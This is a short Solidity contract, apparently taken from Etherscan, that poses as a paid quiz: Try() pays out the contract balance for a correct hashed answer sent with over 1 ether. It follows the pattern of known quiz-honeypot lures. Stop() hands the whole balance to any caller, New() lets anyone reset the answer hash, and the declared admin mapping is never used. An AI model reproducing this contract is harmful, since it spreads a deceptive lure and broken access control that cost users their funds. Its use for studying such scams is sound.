/**
 *Submitted for verification at Etherscan.io on 2022-11-19
*/

contract There_QUIZ
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 public responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable {
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() {   
    }

    fallback() external {}

    function depositETH() public payable {
        require(msg.value > 10 ether, "should be greater than 10.");
    }

    function getBal() public view returns(uint256) {
        return address(this).balance;
    }
}